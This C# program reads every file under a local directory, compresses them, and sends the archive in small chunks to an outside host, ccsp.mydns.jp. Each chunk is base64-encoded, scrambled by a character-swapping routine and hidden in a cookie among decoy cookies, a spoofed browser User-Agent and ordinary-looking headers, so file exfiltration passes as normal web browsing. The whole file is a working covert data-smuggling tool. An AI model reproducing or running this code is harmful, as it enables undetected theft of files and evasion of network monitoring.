using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.IO;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using Charlotte.Commons;
using Charlotte.Tests;
using Charlotte.WebServices;

namespace Charlotte
{
	class Program
	{
		static void Main(string[] args)
		{
			ProcMain.CUIMain(new Program().Main2);
		}

		private void Main2(ArgsReader ar)
		{
			if (ProcMain.DEBUG)
			{
				Main3();
			}
			else
			{
				Main4();
			}
			Common.OpenOutputDirIfCreated();
		}

		private void Main3()
		{
			Main4();
			Common.Pause();
		}

		private void Main4()
		{
			// -- choose one --

			Main5(@"C:\Dev\Server\HP80");
			//new Test0001().Test01();
			//new Test0002().Test01();
			//new Test0003().Test01();

			// --
		}

		private const string INPUT_FILE = @"C:\temp\ricecake.dat";

		private void Main5(string inputDir)
		{
			MakeInputFile(inputDir);

			byte[] data = File.ReadAllBytes(INPUT_FILE);

			while (1 <= data.Length)
			{
				ProcMain.WriteLog("data: " + data.Length);

				byte[][] parts = Cut(data);
				SendData(parts[0]);
				data = parts[1];
			}
			ProcMain.WriteLog("OK!");
		}

		private void MakeInputFile(string inputDir)
		{
			List<byte> buff = new List<byte>();

			inputDir = SCommon.MakeFullPath(inputDir);

			foreach (string file in Directory.GetFiles(inputDir, "*", SearchOption.AllDirectories))
			{
				string virFile = SCommon.ChangeRoot(file, inputDir, @"C:\work\Benzo\workspace"); // 仮定パス

				Console.WriteLine("< " + file); // cout
				Console.WriteLine("> " + virFile); // cout

				byte[] bVirFile = SCommon.ENCODING_SJIS.GetBytes(virFile);

				buff.AddRange(SCommon.ToBytes(bVirFile.Length));
				buff.AddRange(bVirFile);

				byte[] fileData = File.ReadAllBytes(file);

				buff.AddRange(SCommon.ToBytes(fileData.Length));
				buff.AddRange(fileData);
			}
			File.WriteAllBytes(INPUT_FILE, SCommon.Compress(buff.ToArray()));
		}

		private byte[][] Cut(byte[] data)
		{
			if (data.Length < 1000)
			{
				return new byte[][] { data, new byte[0] };
			}
			return Cut(data, data.Length / (data.Length / 1000 + 1));
		}

		private byte[][] Cut(byte[] data, int p)
		{
			int q = data.Length - p;

			byte[] part1 = new byte[p];
			byte[] part2 = new byte[q];

			for (int index = 0; index < p; index++)
			{
				part1[index] = data[index];
			}
			for (int index = 0; index < q; index++)
			{
				part2[index] = data[p + index];
			}
			return new byte[][] { part1, part2 };
		}

		private void SendData(byte[] data)
		{
			ProcMain.WriteLog("ST-SendData " + data.Length);

			string[][] encData = Enc(data);

			HTTPClient hc = new HTTPClient("http://ccsp.mydns.jp");

			foreach (string[] pair in encData)
			{
				hc.AddHeader(pair[0], pair[1]);
			}
			hc.Get();

			ProcMain.WriteLog("ED-SendData " + hc.ResHeaders["X-Biscuit"]);
		}

		private static string[][] Enc(byte[] data)
		{
			return new string[][] 
			{
				new string[] { "Upgrade-Insecure-Requests", "1" },
				new string[] { "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Biscuit/1.0 Chrome/96.0.4664.45 Safari/537.36" },
				new string[] { "Cookie", GetCookie(data) },
				new string[] { "Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" },
				new string[] { "Accept-Encoding", "gzip, deflate" },
				new string[] { "Accept-Language", "ja,en-US;q=0.9,en;q=0.8" },
			};
		}

		private static string GetCookie(byte[] data)
		{
			string sData = SCommon.Base64.I.Encode(data);
			sData = ZEnc(sData);
			string[][] pairs = GetCookiePairs(sData);
			List<string> tokens = new List<string>();

			foreach (string[] pair in pairs)
			{
				tokens.Add(pair[0] + "=" + pair[1]);
			}
			return string.Join("; ", tokens);
		}

		private static string[][] GetCookiePairs(string sData)
		{
			List<string[]> pairs = new List<string[]>();

			pairs.Add(new String[] { "BID", "11843881-1-23-809-2" });
			pairs.Add(new String[] { "ORZ", "67414-874-31" });
			pairs.Add(new String[] { "Biscuit", sData });
			pairs.Add(new String[] { "IP", "1992-13-63-69" });
			pairs.Add(new String[] { "z", "1" });

			return pairs.ToArray();
		}

		private static String ZEnc(String str)
		{
			foreach (int es in new int[] { 2, 7, 11, 5, 13, 3, 17, 2, 19, 1, 19, 2, 17, 3, 13, 5, 11, 7, 2 })
			{
				str = ZEncP(str, 1, es);
			}
			return str;
		}

		private static String ZEncP(String sData, int ss, int es)
		{
			char[] cs = sData.ToArray();

			int s = 0;
			int e = sData.Length - es;

			while (s < e)
			{
				{
					char tmp = cs[s];
					cs[s] = cs[e];
					cs[e] = tmp;
				}

				s += ss;
				e -= es;
			}
			return new string(cs);
		}
	}
}
